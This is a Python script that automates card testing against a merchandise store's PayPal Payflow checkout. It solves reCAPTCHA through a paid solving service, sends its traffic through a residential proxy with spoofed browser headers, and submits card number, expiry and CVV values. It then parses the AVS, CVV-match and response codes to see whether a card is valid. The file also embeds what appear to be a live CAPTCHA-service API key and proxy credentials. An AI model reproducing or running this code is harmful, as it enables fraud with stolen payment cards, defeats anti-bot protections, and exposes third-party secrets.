import aiohttp
import asyncio
import capsolver

CAPSOLVER_KEY = "CAP-02DB3E5188C3DDD58C43DCF9B69FE560"
SITE_KEY = "6LfcPOUoAAAAAFVTBIDDU5QXERAS9F65Dmso8ixm"

class CaptchaSolver:
    @staticmethod
    async def solve_v2(sitekey: str, url: str) -> str:
        retries = 20 
        for attempt in range(retries):
            try:
                capsolver.api_key = CAPSOLVER_KEY
                loop = asyncio.get_event_loop()
                solution = await loop.run_in_executor(
                    None,
                    lambda: capsolver.solve({
                        "type": "ReCaptchaV3TaskProxyLess", 
                        "websiteURL": url,
                        "websiteKey": sitekey,
                    })
                )
                if solution.get("gRecaptchaResponse", ""):
                    return solution.get("gRecaptchaResponse", "")
                else:
                    raise Exception("Captcha Failed")
            except Exception as e:
                print(f"Retrying {attempt + 1}: {e}")
                if attempt < retries - 1:
                    await asyncio.sleep(0)  
                else:
                    print("Max Retries")
                    return ""

username = "95wa9yh3c5-mobile.res-country-US-hold-query-session-66ebee49492f7"
password = "jm5JUBISFCkdMtWdF"
ip = "190.2.130.11"
puerto = "9999"
proxy = f"http://{username}:{password}@{ip}:{puerto}"

async def pf(cc, mes, ano, cvv):
    connector = aiohttp.TCPConnector(ssl=False)  

    async with aiohttp.ClientSession(connector=connector) as session:
        captcharesponse = await CaptchaSolver.solve_v2(SITE_KEY, 'https://merch.axiomspace.com')
        if captcharesponse:
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://merch.axiomspace.com',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://merch.axiomspace.com/checkout',
                'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            data = [
                ('form_key', 'LH3BKZCKHKV9Z6bq'),
                ('captcha_form_id', 'payment_processing_request'),
                ('payment[method]', 'payflowpro'),
                ('billing-address-same-as-shipping', 'on'),
                ('g-recaptcha-response', captcharesponse),
                ('captcha_form_id', 'co-payment-form'),
                ('orderAttributes[reason_for_purchase]', ''),
                ('orderAttributes[explanation_for_approver]', ''),
                ('token', captcharesponse),
                ('controller', 'checkout_flow'),
                ('cc_type', 'VI'),
            ]

            while True:
                async with session.post(
                    'https://merch.axiomspace.com/paypal/transparent/requestSecureToken/',
                    headers=headers,
                    data=data,
                    proxy=proxy  
                ) as response:
                    result = await response.text()
                    print(result)

                    if '"error_messages":"reCAPTCHA verification failed."' in result:
                        print("Captcha failed, retrying...")
                        captcharesponse = await CaptchaSolver.solve_v2(SITE_KEY, 'https://merch.axiomspace.com')
                        data = [
                            ('form_key', 'LH3BKZCKHKV9Z6bq'),
                            ('captcha_form_id', 'payment_processing_request'),
                            ('payment[method]', 'payflowpro'),
                            ('billing-address-same-as-shipping', 'on'),
                            ('g-recaptcha-response', captcharesponse),
                            ('captcha_form_id', 'co-payment-form'),
                            ('orderAttributes[reason_for_purchase]', ''),
                            ('orderAttributes[explanation_for_approver]', ''),
                            ('token', captcharesponse),
                            ('controller', 'checkout_flow'),
                            ('cc_type', 'VI'),
                        ]
                        continue
                    else:
                        try:
                            nonceid = result.split('"securetokenid":"')[1].split('"')[0]
                            noncetoken = result.split('"securetoken":"')[1].split('"')[0]
                        except IndexError:
                            print("Failed to extract tokens.")
                            return
                        break

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://merch.axiomspace.com',
                'priority': 'u=0, i',
                'referer': 'https://merch.axiomspace.com/',
                'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'iframe',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            }

            data = {
                'result': '0',
                'securetoken': noncetoken,
                'securetokenid': nonceid,
                'respmsg': 'Approved',
                'result_code': '0',
                'csc': cvv,
                'expdate': f"{mes}{ano[-2:]}",  
                'acct': cc,
            }

            async with session.post('https://payflowlink.paypal.com/', headers=headers, data=data, proxy=proxy) as response:
                text = await response.text()

                avsdata = text.split('type="hidden" name="AVSDATA" value="')[1].split('"')[0] if 'AVSDATA' in text else 'none'
                cvv2match = text.split('type="hidden" name="PROCCVV2" value="')[1].split('"')[0] if 'PROCCVV2' in text else 'none'
                respmsg = text.split('type="hidden" name="RESPMSG" value="')[1].split('"')[0] if 'RESPMSG' in text else 'none'
                resptext = text.split('type="hidden" name="RESPTEXT" value="')[1].split('"')[0] if 'RESPTEXT' in text else 'none'
                authcode = text.split('type="hidden" name="ASSOCIATIONRESPCODE" value="')[1].split('"')[0] if 'ASSOCIATIONRESPCODE' in text else 'none'
                hostcode = text.split('type="hidden" name="HOSTCODE" value="')[1].split('"')[0] if 'HOSTCODE' in text else 'none'

            return avsdata, respmsg, authcode, resptext, hostcode, cvv2match
